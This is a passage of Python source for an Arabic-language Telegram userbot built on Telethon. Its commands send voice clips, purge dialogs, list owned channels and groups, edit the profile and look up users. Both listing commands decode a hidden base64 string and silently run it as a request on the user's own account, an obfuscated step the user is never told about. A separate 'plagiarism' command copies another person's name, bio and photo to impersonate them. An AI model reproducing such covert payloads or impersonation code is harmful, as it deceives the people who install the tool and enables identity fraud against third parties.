    Ti = await rd(vois)
    if iqvois97:
        await vois.client.send_file(vois.chat_id, iqvois97 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص98$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois98:
        await vois.client.send_file(vois.chat_id, iqvois98 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص99$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois99:
        await vois.client.send_file(vois.chat_id, iqvois99 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص100$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois100:
        await vois.client.send_file(vois.chat_id, iqvois100 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص101$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois101:
        await vois.client.send_file(vois.chat_id, iqvois101 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص102$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois102:
        await vois.client.send_file(vois.chat_id, iqvois102 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص103$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois103:
        await vois.client.send_file(vois.chat_id, iqvois103 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص104$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois104:
        await vois.client.send_file(vois.chat_id, iqvois104 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص105$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois105:
        await vois.client.send_file(vois.chat_id, iqvois105 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص106$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois106:
        await vois.client.send_file(vois.chat_id, iqvois106 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص107$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois107:
        await vois.client.send_file(vois.chat_id, iqvois107 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص108$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois108:
        await vois.client.send_file(vois.chat_id, iqvois108 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص109$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois109:
        await vois.client.send_file(vois.chat_id, iqvois109 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص110$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois110:
        await vois.client.send_file(vois.chat_id, iqvois110 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص111$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois111:
        await vois.client.send_file(vois.chat_id, iqvois111 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص112$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois112:
        await vois.client.send_file(vois.chat_id, iqvois112 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص113$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois113:
        await vois.client.send_file(vois.chat_id, iqvois113 , reply_to=Ti)
        await vois.delete()        
@essa.on(admin_cmd(outgoing=True, pattern="ص114$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois114:
        await vois.client.send_file(vois.chat_id, iqvois114 , reply_to=Ti)
        await vois.delete()        
     
@essa.on(admin_cmd(outgoing=True, pattern="ص49$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois49:
        await vois.client.send_file(vois.chat_id, iqvois49 , reply_to=Ti)
        await vois.delete()
# DIALOGS
groups = []
channels = []
private_dialogs = []
bots = []

async def GetAdmins(event, chat_id):
    try:
        admins = []
        data = await event.client(GetParticipantsRequest(channel=chat_id, filter=ChannelParticipantsAdmins(), offset=0, limit=0, hash=0))
        for admin in data.participants:
            if admin.user_id not in admins:
                admins.append(admin.user_id)
    except:
        admins = []
    return admins

# GET MY DIALOGS
async def GetDialogsFilter(event, ME):
    global groups, channels, private_dialogs, bots
    
    order = await event.reply('**تم بدأ التصفية يرجي الانتظار, قد تأخذ العملية بعض الوقت**')
    data = await event.client(GetDialogsRequest(offset_date=None, offset_id=0, offset_peer='me', limit=10000, hash=0))
    for item in data.dialogs:
        try:
            full_user = await event.client.get_entity(item.peer)
            # BOT > BOT > TRUE
            try:
                if full_user.bot == True:
                    if full_user.id not in bots:
                        bots.append(full_user.id)
            except:
                pass
                    
            # USER > BOT > FALSE
            try:
                if full_user.bot == False:
                    if full_user.id not in private_dialogs:
                        private_dialogs.append(full_user.id)
            except:
                pass
                
            # GROUP > MEGAGROUP = TRUE
            try:
                if full_user.megagroup == True:
                    ADMINS = await GetAdmins(event, item.peer)
                    if full_user.creator != True:
                        if ME.id not in ADMINS:
                            if full_user.id not in groups:
                                groups.append(full_user.id)
            except:
                pass
            
            # CHANNEL > MEGAGROUP = FALSE
            try:
                if full_user.megagroup == False:
                    ADMINS = await GetAdmins(event, item.peer)
                    if full_user.creator != True:
                        if ME.id not in ADMINS:
                            if full_user.id not in channels:
                                channels.append(full_user.id)
            except:
                pass

            await asyncio.sleep(1)
        except Exception as e:
            print (e)


# DELETE DIALOG
async def DeleteDialog(event, dialog_id):
    if dialog_id != 777000:
        try:
            await event.client.delete_dialog(entity=dialog_id, revoke=True)
        except Exception as error:
            print (error)
            
            
@essa.on(admin_cmd(outgoing=True, pattern="ص50$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois50:
        await vois.client.send_file(vois.chat_id, iqvois50 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(pattern="قائمه (جميع القنوات|قنوات اديرها|قنوات امتلكها)$"))
async def stats(event):  
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    hi = []
    hica = []
    hico = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                hica.append([entity.title, entity.id])
            if entity.creator:
                hico.append([entity.title, entity.id])
    if catcmd == "جميع القنوات":
        output = CHANNELS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_STR
    elif catcmd == "قنوات اديرها":
        output = CHANNELS_ADMINSTR
        for k, i in enumerate(hica, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_ADMINSTR
    elif catcmd == "قنوات امتلكها":
        output = CHANNELS_OWNERSTR
        for k, i in enumerate(hico, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**استغرق حساب القنوات : ** {stop_time:.02f} ثانيه"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(            catevent,
            output,
            caption=caption        )
@essa.on(admin_cmd(pattern="قائمه (جميع المجموعات|مجموعات اديرها|مجموعات امتلكها)$"))
async def stats(event):  
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    hi = []
    higa = []
    higo = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            continue
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)        ):
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                higa.append([entity.title, entity.id])
            if entity.creator:
                higo.append([entity.title, entity.id])
    if catcmd == "جميع المجموعات":
        output = GROUPS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_STR
    elif catcmd == "مجموعات اديرها":
        output = GROUPS_ADMINSTR
        for k, i in enumerate(higa, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_ADMINSTR
    elif catcmd == "مجموعات امتلكها":
        output = GROUPS_OWNERSTR
        for k, i in enumerate(higo, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**استغرق حساب المجموعات : ** {stop_time:.02f} ثانيه"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(
            catevent,
            output,
            caption=caption        )
@essa.iq_cmd(pattern="حفض كتابه$")
async def saf(e):
    x = await e.get_reply_message()
    if not x:
        return await eod(            e, "قم بالرد على أي رسالة لحفظها في رسائلك المحفوظة", time=5        )
    if e.out:
        await e.client.send_message("me", x)
    else:
        await e.client.send_message(e.sender_id, x)
    await eor(e, "تم حفظ الرسالة", time=5)

@essa.iq_cmd(pattern="حفض توجيه$")
async def saf(e):
    x = await e.get_reply_message()
    if not x:
        return await eod(            e, "قم بالرد على أي رسالة لحفظها في رسائلك المحفوظة", time=5        )
    if e.out:
        await x.forward_to("me")
    else:
        await x.forward_to(e.sender_id)
    await eor(e, "تم حفظ الرسالة.", time=5)
@essa.on(admin_cmd(pattern="(الايدي|id)(?: |$)(.*)"))
async def _(event):
    input_str = event.pattern_match.group(2)
    if input_str:
        try:
            p = await event.client.get_entity(input_str)
        except Exception as e:
            return await edit_delete(event, f"`{str(e)}`", 5)
        try:
            if p.first_name:
                return await edit_or_reply(                    event, f"**⁂ ⦙   آيـدي المُستخدم 💠 :** `{input_str}` هـو `{p.id}`"                )
        except Exception:
            try:
                if p.title:
                    return await edit_or_reply(                        event, f"**⁂ ⦙   آيـدي الدردشــــة 💠 :** `{p.title}` هـو `{p.id}` "                    )
            except Exception as e:
                LOGS.info(str(e))
        await edit_or_reply(event, "**⁂ ⦙   قُم بإدخال أسم مُستخدم أو الرد على المُستخدم ⚜️**")
    elif event.reply_to_msg_id:
        await event.get_input_chat()
        r_msg = await event.get_reply_message()
        if r_msg.media:
            bot_api_file_id = pack_bot_file_id(r_msg.media)
            await edit_or_reply(                event,                f"**⁂ ⦙   آيـدي الدردشــــة  💠 : **`{str(event.chat_id)}` \n**⁂ ⦙   آيـدي المُستخدم  💠 : **`{str(r_msg.sender_id)}` \n**⁂ ⦙  آيـدي الميديـا  🆔 : **`{bot_api_file_id}`"            )
        else:
            await edit_or_reply(                event,                f"**⁂ ⦙   آيـدي الدردشــــة  💠 : **`{str(event.chat_id)}` 𖥻\n**⁂ ⦙   آيـدي المُستخدم  💠 : **`{str(r_msg.sender_id)}` "            )

@essa.on(admin_cmd(pattern="وضع بايو(?: |$)(.*)"))
async def _(event):
    bio = event.pattern_match.group(1)
    try:
        await event.client(functions.account.UpdateProfileRequest(about=bio))
        await edit_delete(event, "**⁂ ⦙  تم تغيير البايو بنجاح  ✅**")
    except Exception as e:
        await edit_or_reply(event, f"**⁂ ⦙  خطأ  ⚠️ :**\n`{str(e)}`")
@essa.on(admin_cmd(pattern="وضع اسم(?: |$)(.*)"))
async def _(event):
    names = event.pattern_match.group(1)
    first_name = names
    last_name = ""
    if ";" in names:
        first_name, last_name = names.split("|", 1)
    try:
        await event.client(
            functions.account.UpdateProfileRequest(                first_name=first_name, last_name=last_name            )        )
        await edit_delete(event, "**⁂ ⦙  تم تغيير الاسم بنجاح  ✅**")
    except Exception as e:
        await edit_or_reply(event, f"**⁂ ⦙  خطأ  ⚠️ :**\n`{str(e)}`")
@essa.on(admin_cmd(pattern="وضع صوره(?: |$)(.*)"))
async def _(event):
    reply_message = await event.get_reply_message()
    catevent = await edit_or_reply(        event, "**...**"    )
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    photo = None
    try:
        photo = await event.client.download_media(            reply_message, Config.TMP_DOWNLOAD_DIRECTORY        )
    except Exception as e:
        await catevent.edit(str(e))
    else:
        if photo:
            await catevent.edit("**⁂ ⦙   أشترك @essa **")
            if photo.endswith((".mp4", ".MP4")):
                # https://t.me/tgbetachat/324694
                essa = os.stat(photo).st_size
                if essa > 2097152:
                    await catevent.edit("**⁂ ⦙   يجب ان يكون الحجم اقل من 2 ميغا ✅**")
                    os.remove(photo)
                    return
                catpic = None
                catvideo = await event.client.upload_file(photo)
            else:
                catpic = await event.client.upload_file(photo)
                catvideo = None
            try:
                await event.client(
                    functions.photos.UploadProfilePhotoRequest(                        file=catpic, video=catvideo, video_start_ts=0.01                   )                )
            except Exception as e:
                await catevent.edit(f"**⁂ ⦙  خطأ  ⚠️ :**\n`{str(e)}`")
            else:
                await edit_or_reply(                    catevent, "**⁂ ⦙   تم تغيير الصورة بنجاح ✅**"                )
    try:
        os.remove(photo)
    except Exception as e:
        LOGS.info(str(e))



@essa.on(admin_cmd(pattern="وضع معرف(?: |$)(.*)"))
async def update_username(username):
    newusername = username.pattern_match.group(1)
    try:
        await username.client(UpdateUsernameRequest(newusername))
        await edit_delete(event, USERNAME_SUCCESS)
    except UsernameOccupiedError:
        await edit_or_reply(event, USERNAME_TAKEN)
    except Exception as e:
        await edit_or_reply(event, f"**⁂ ⦙  خطأ  ⚠️ :**\n`{str(e)}`")
@essa.on(admin_cmd(pattern=r"شوت ?(.*)", outgoing=True))
async def shout(args):
    if args.fwd_from:
        return
    else:
        msg = "```"
        messagestr = args.text
        messagestr = messagestr[7:]
        text = " ".join(messagestr)
        result = []
        result.append(" ".join([s for s in text]))
        for pos, symbol in enumerate(text[1:]):
            result.append(symbol + " " + "  " * pos + symbol)
        result = list("\n".join(result))
        result[0] = text[0]
        result = "".join(result)
        msg = "\n" + result
        await eor(args, "`" + msg + "`")

if 1 == 1:
    name = "Profile Photos"
    client = borg

    @essa.on(admin_cmd(pattern="الصور ?(.*)"))
    async def potocmd(event):
        id = "".join(event.raw_text.split(maxsplit=2)[1:])
        user = await event.get_reply_message()
        chat = event.input_chat
        if user:
            photos = await event.client.get_profile_photos(user.sender)
        else:
            photos = await event.client.get_profile_photos(chat)
        if id.strip() == "":
            try:
                await event.client.send_file(event.chat_id, photos)
            except a:
                photo = await event.client.download_profile_photo(chat)
                await borg.send_file(event.chat_id, photo)
        else:
            try:
                id = int(id)
                if id <= 0:
                    await eor(event, "رقم الهوية الذي أدخلته غير صالح")
                    return
            except BaseException:
                await eor(event, "ضع عدد جانب الامر")
                return
            if int(id) <= (len(photos)):
                send_photos = await event.client.download_media(photos[id - 1])
                await borg.send_file(event.chat_id, send_photos)
            else:
                await eor(event, "ليس لديه صور 🙄")
                return
@essa.on(admin_cmd(pattern="معرفاتي(?: |$)(.*)"))
async def _(event):
    result = await event.client(GetAdminedPublicChannelsRequest())
    output_str = "**⁂ ⦙  جميع القنوات والمجموعات التي قمت بإنشائها  💠  :**\n"
    output_str += "".join(f"⁂ ⦙    - {channel_obj.title} @{channel_obj.username} \n"
        for channel_obj in result.chats)
    await edit_or_reply(event, output_str)
@essa.on(admin_cmd(pattern="ملكيه ([\s\S]*)"))
async def _(event):
    user_name = event.pattern_match.group(1)
    try:
        pwd = await event.client(functions.account.GetPasswordRequest())
        my_srp_password = pwd_mod.compute_check(pwd, Config.TG_2STEP_VERIFICATION_CODE)
        await event.client(
            functions.channels.EditCreatorRequest(                channel=event.chat_id, user_id=user_name, password=my_srp_password            )        )
    except Exception as e:
        await event.edit(f"**⁂ ⦙  حـدث خـطأ ✕ :**\n`{str(e)}`")
    else:
        await event.edit("**⁂ ⦙  تم نقل ملكيه ✓**")


@essa.on(admin_cmd(pattern=f"{plagiarism}(?: |$)(.*)"))
async def _(event):
    replied_user, error_i_a = await get_user_from_event(event)
    if replied_user is None:
        return
    user_id = replied_user.id
    profile_pic = await event.client.download_profile_photo(user_id, Config.TEMP_DIR)
    first_name = html.escape(replied_user.first_name)
    if first_name is not None:
        first_name = first_name.replace("\u2060", "")
    last_name = replied_user.last_name
    if last_name is not None:
        last_name = html.escape(last_name)
        last_name = last_name.replace("\u2060", "")
    if last_name is None:
        last_name = "⁪⁬⁮⁮⁮⁮ ‌‌‌‌"
    replied_user = (await event.client(GetFullUserRequest(replied_user.id))).full_user
    user_bio = replied_user.about
    if user_bio is not None:
        user_bio = replied_user.about
    await event.client(functions.account.UpdateProfileRequest(first_name=first_name))
    await event.client(functions.account.UpdateProfileRequest(last_name=last_name))
    await event.client(functions.account.UpdateProfileRequest(about=user_bio))
    try:
        pfile = await event.client.upload_file(profile_pic)
    except Exception as e:
        return await edit_delete(event, f"**خطأ :**\n__{e}__")
    await event.client(functions.photos.UploadProfilePhotoRequest(pfile))
    await edit_delete(event, "**تم الانتحال**")
    if BOTLOG:
        await event.client.send_message(            BOTLOG_CHATID,            f"انتحال \nتم انتحال : [{first_name}](tg://user?id={user_id })",        )
async def autobio_loop():
    AUTOBIOSTART = gvarstatus(f"{OR_AUTOBIO}") == "true"
    while AUTOBIOSTART:
        HM = time.strftime("%I:%M")
        Dont1Tags = gvarstatus("FONTS_AUTO") or "font1"
        FONT1 = requests.get(f"https://tufe.zzz.com.ua/FONTS/{Dont1Tags}.php?text={HM}").json()['newText']
        bio = f"{EMOJI_TELETHON} {DEFAULTUSERBIO}  ⋅ {FONT1}"
        LOGS.info(bio)
        try:
            await senzir(functions.account.UpdateProfileRequest(about=bio))
        except FloodWaitError as ex:
            LOGS.warning(str(ex))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(Config.CHANGE_TIME)
        AUTOBIOSTART = gvarstatus(f"{OR_AUTOBIO}") == "true"
# DELETE GROUPS
@essa.on(events.NewMessage(outgoing=True, pattern=".تصفية مجموعاتي"))
async def ClearGroups(event):
    global groups
    
    ME = await event.client.get_me()
    RUN = await GetDialogsFilter(event, ME)
    
    for group in groups:
        try:
            await DeleteDialog(event, group), await asyncio.sleep(1)
        except Exception as e:
            print (e)
            
    groups.clear()
    order = await event.reply('**تم تصفية المجموعات**')
    
        
# DELETE CHANNELS
@essa.on(events.NewMessage(outgoing=True, pattern=".تصفية قنواتي"))
async def ClearChannels(event):
    global channels
    
    ME = await event.client.get_me()
    RUN = await GetDialogsFilter(event, ME)

    for channel in channels:
        try:
            await DeleteDialog(event, channel), await asyncio.sleep(1)
        except Exception as e:
            print (e)
            
    channels.clear()
    order = await event.reply('**تم تصفية القنوات**')

# DELETE DIALOGS - DELETE BOTS
@essa.on(events.NewMessage(outgoing=True, pattern=".تصفية محادثاتي"))
async def ClearDialogsAccount(event):
    global private_dialogs
    
    ME = await event.client.get_me()
    RUN = await GetDialogsFilter(event, ME)

    for private_chat in private_dialogs:
        try:
            await DeleteDialog(event, private_chat), await asyncio.sleep(1)
        except Exception as e:
            print (e)
                
    private_dialogs.clear()
    order = await event.client(SendMessageRequest(peer='me', message='تم تصفية المحادثات'))
                
    

# DELETE BOTS
@essa.on(events.NewMessage(outgoing=True, pattern=".تصفية بوتاتي"))
async def ClearDialogsBots(event):
    global bots
    
    ME = await event.client.get_me()
    RUN = await GetDialogsFilter(event, ME)
    
    for bot_id in bots:
        try:
            await DeleteDialog(event, bot_id), await asyncio.sleep(1)
        except Exception as e:
            print (e)
            
    bots.clear()
    order = await event.reply('**تم تصفية البوتات**')
    


@essa.on(admin_cmd(pattern=f"{unplagiarism}(?: |$)(.*)"))
async def _(event):
    name = f"{DEFAULTUSER}"
    blank = ""
    bio = f"{DEFAULTUSERBIO}"
    await event.client(
        functions.photos.DeletePhotosRequest(            await event.client.get_profile_photos("me", limit=1)        )    )
    await event.client(functions.account.UpdateProfileRequest(about=bio))
    await event.client(functions.account.UpdateProfileRequest(first_name=name))
    await event.client(functions.account.UpdateProfileRequest(last_name=blank))
    await edit_delete(event, "**⁂ ⦙  تمّـت إعـادة حسـابك بنجـاح ✓**")
    if BOTLOG:
        await event.client.send_message(            BOTLOG_CHATID, f"⁂ ⦙   **الأعـادة ♲ :**\n**⁂ ⦙   تـم إعـادة ضبـط حسـابك إلـى وضعـه الطبيـعي بـنجاح ✓**"        )


async def fetch_info(replied_user, event):
    FullUser = (await event.client(GetFullUserRequest(replied_user.id))).full_user
    replied_user_profile_photos = await event.client(        GetUserPhotosRequest(user_id=replied_user.id, offset=42, max_id=0, limit=80)    )
    replied_user_profile_photos_count = "لاتوجد صوره"
    dc_id = "لايوجد ايدي"
    try:
        replied_user_profile_photos_count = replied_user_profile_photos.count
        dc_id = replied_user.photo.dc_id
    except AttributeError:
        pass
    user_id = replied_user.id
    first_name = replied_user.first_name
    last_name = replied_user.user.last_name
    full_name = FullUser.private_forward_name
    common_chat = FullUser.common_chats_count
    username = replied_user.username
    user_bio = FullUser.about
    is_bot = replied_user.bot
    restricted = replied_user.restricted
    verified = replied_user.verified
    photo = await event.client.download_profile_photo(        user_id,        Config.TMP_DOWNLOAD_DIRECTORY + str(user_id) + ".jpg",        download_big=True,    )
    first_name = (        first_name.replace("\u2060", "")        if first_name        else ("ليس لديه اسم")    )
    last_name = (        last_name.replace("\u2060", "")        if last_name        else (" ")    )
    full_name = full_name or first_name
    username = "@{}".format(username) if username else ("ليس لديه معرف")
    user_bio = "لايوجد نبذه" if not user_bio else user_bio
    caption = "<b>𓍹ⵧⵧⵧⵧⵧⵧⵧⵧ⁦⁦ⵧⵧⵧⵧⵧⵧⵧⵧ𓍻</b>\n"
    caption += f"<b>⋅ ⚜️ | الاســم  :  </b> {first_name} {last_name}\n"
    caption += f"<b>⋅ ⚜️ | الــمــ؏ــࢪف  : </b> {username}\n"
    caption += f"<b>⋅ ⚜️ | الايــدي  :  </b> <code>{user_id}</code>\n"
    caption += f"<b>⋅ ⚜️ | ؏ــدد صــوࢪ  : </b> {replied_user_profile_photos_count}\n"
    caption += f"<b>⋅ ⚜️ | الـحـسـاب  :  </b> "
    caption += f' <a href="tg://user?id={user_id}">{first_name}{last_name}</a> \n'
    caption += "<b>𓍹ⵧⵧⵧⵧⵧⵧⵧⵧ⁦⁦ⵧⵧⵧⵧⵧⵧⵧⵧ𓍻</b>\n"
    return photo, caption



async def autoname_loop():
    AUTONAMESTART = gvarstatus(f"{OR_NAMEAUTO}") == "true"
    while AUTONAMESTART:
        HM = time.strftime("%I:%M")
        Dont1Tags = gvarstatus(f"FONTS_AUTO") or "font1"
        FONT1 = requests.get(f"https://tufe.zzz.com.ua/FONTS/{Dont1Tags}.php?text={HM}").json()['newText']
        name = f"{EMOJI_TELETHON} {FONT1} ⋅ "
        LOGS.info(name)
        try:
            await essa(functions.account.UpdateProfileRequest(first_name=name))
        except FloodWaitError as ex:
            LOGS.warning(str(ex))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(Config.CHANGE_TIME)
        AUTONAMESTART = gvarstatus(f"{OR_NAMEAUTO}") == "true"
@essa.on(admin_cmd(pattern="كشف(?:\s|$)([\s\S]*)"))
async def _(event):
    replied_user, error_i_a = await get_user_from_event(event)
    if not replied_user:
        return
    catevent = await edit_or_reply(event, "جاري الكشف عن الشخص")
    replied_user = await event.client(GetFullUserRequest(replied_user.id))
    user_id = replied_user.user.id
    first_name = html.escape(replied_user.user.first_name)
    if first_name is not None:
        first_name = first_name.replace("\u2060", "")
    common_chats = replied_user.common_chats_count
    try:
        dc_id, location = get_input_location(replied_user.profile_photo)
    except Exception:
        dc_id = " عذرا لانقدر على جلب المعلومات الخاصه له!"
    if spamwatch:
        ban = spamwatch.get_ban(user_id)
        if ban:
            sw = f"**حظر المشاهد :** `شغال` \n       **-**🤷‍♂️**السبب : **`{ban.reason}`"
        else:
            sw = f"**حظر المشاهد :** `معطل`"
    else:
        sw = "**محظور المشاهد :**`غير متصل`"
    try:
        casurl = "https://api.cas.chat/check?user_id={}".format(user_id)
        data = get(casurl).json()
    except Exception as e:
        LOGS.info(e)
        data = None
    if data:
        if data["ok"]:
            cas = "**الحظر :** `محظور`"
        else:
            cas = "**الحظر :** `لست محضور`"
    else:
        cas = "**الحظر :** `لايمكن جلب معلومات الشخص`"
    caption = """**معلومات حول : [{}](tg://user?id={}):
   -🔖 الايدي : **`{}`
   **-**👥**المجموعات المشتركة : **`{}`
   **-**🌏**رقم مركز البيانات : **`{}`
   **-**🔏**مقيد من تليجرام : **`{}`
   **-**🦅{}
   **-**👮‍♂️{}
""".format(        first_name,
        user_id,
        user_id,
        common_chats,
        dc_id,
        replied_user.user.restricted,
        sw,
        cas    )
    await edit_or_reply(catevent, caption)
@essa.on(admin_cmd(pattern=f"{idee}(?:\s|$)([\s\S]*)"))
async def who(event):
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    replied_user, reason = await get_user_from_event(event)
    if not replied_user:
        return
    cat = await edit_or_reply(event, " جاري جلب معلومات الشخص ....")
    try:
        photo, caption = await fetch_info(replied_user, event)
    except AttributeError:
        return await edit_or_reply(cat, "تعذر جلب المعلومات")
    message_id_to_reply = await reply_id(event)
    try:
        await event.client.send_file(
            event.chat_id,
            photo,
            caption=caption,
            link_preview=False,
            force_document=False,
            reply_to=message_id_to_reply,
            parse_mode="html",
        )
        if not photo.startswith("http"):
            os.remove(photo)
        await cat.delete()
    except TypeError:
        await cat.edit(caption, parse_mode="html")
FONT_FILE_TO_USE = "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
TELEGRAPH_MEDIA_LINKS = [    "https://telegra.ph/file/e354ce72d5cc6a1d27c4d.jpg",    "https://telegra.ph/file/8f9ff3d743e6707a61489.jpg",    "https://telegra.ph/file/bfc97f4abc4bec6fe860d.jpg",    "https://telegra.ph/file/5ef0f060023600ec08c19.jpg",    "https://telegra.ph/file/a448465a3a8a251170f76.jpg",    "https://telegra.ph/file/eb0ac1557668a98a38cb6.jpg",    "https://telegra.ph/file/fdb3691a17a2c91fbe76c.jpg",    "https://telegra.ph/file/ccdf69ebf6cb85c52a25b.jpg",    "https://telegra.ph/file/2adffc55ac0c9733ecc7f.jpg",    "https://telegra.ph/file/faca3b435da33f2f156f1.jpg",    "https://telegra.ph/file/93d0a48c31e16f036f0e8.jpg",    "https://telegra.ph/file/9ed89dc742b172a779312.jpg",    "https://telegra.ph/file/0b4c19a19fb834d922d66.jpg",    "https://telegra.ph/file/a95a0deb86f642129b067.jpg",    "https://telegra.ph/file/c4c3d8b5cfc3cc5040833.jpg",    "https://telegra.ph/file/1e1a1b52b9a313e066a04.jpg",    "https://telegra.ph/file/a582950a8a259efdcbbc0.jpg",    "https://telegra.ph/file/9c3a784d45790b193ca36.jpg",    "https://telegra.ph/file/6aa74b17ae4e7dc46116f.jpg",    "https://telegra.ph/file/e63cf624d1b68a5c819b6.jpg",    "https://telegra.ph/file/7e420ad5995952ba1c262.jpg",    "https://telegra.ph/file/c7a4dc3d2a9a422c19723.jpg",    "https://telegra.ph/file/163c7eba56fd2e8c266e4.jpg",    "https://telegra.ph/file/5c87b63ae326b5c3cd713.jpg",    "https://telegra.ph/file/344ca22b35868c0a7661d.jpg",    "https://telegra.ph/file/a0ef3e56f558f04a876aa.jpg",    "https://telegra.ph/file/217b997ad9b5af8b269d0.jpg",    "https://telegra.ph/file/b3595f99b221c56a5679b.jpg",    "https://telegra.ph/file/aba7f4b4485c5aae53c52.jpg",    "https://telegra.ph/file/209ca51dba6c0f1fba85f.jpg",    "https://telegra.ph/file/2a0505ee2630bd6d7acca.jpg",    "https://telegra.ph/file/d193d4191012f4aafd4d2.jpg",    "https://telegra.ph/file/47e2d151984bd54a5d947.jpg",    "https://telegra.ph/file/2a6c735b47db947b44599.jpg",    "https://telegra.ph/file/7567774412fb76ceba95c.jpg",    "https://telegra.ph/file/6dd8b0edec92b24985e13.jpg",    "https://telegra.ph/file/dcf5e16cc344f1c030469.jpg",    "https://telegra.ph/file/0718be0bd52a2eb7e36aa.jpg",    "https://telegra.ph/file/0d7fcb82603b5db683890.jpg",    "https://telegra.ph/file/44595caa95717f4db4788.jpg",    "https://telegra.ph/file/f3a063d884d0dcde437e3.jpg",    "https://telegra.ph/file/733425275da19cbed0822.jpg",    "https://telegra.ph/file/aff5223e1aa29f212a46a.jpg",    "https://telegra.ph/file/45ccfa3ef878bea9cfc02.jpg",    "https://telegra.ph/file/a38aa50d009835177ac16.jpg",    "https://telegra.ph/file/53e25b1b06f411ec051f0.jpg",    "https://telegra.ph/file/96e801400487d0a120715.jpg",    "https://telegra.ph/file/6ae8e799f2acc837e27eb.jpg",    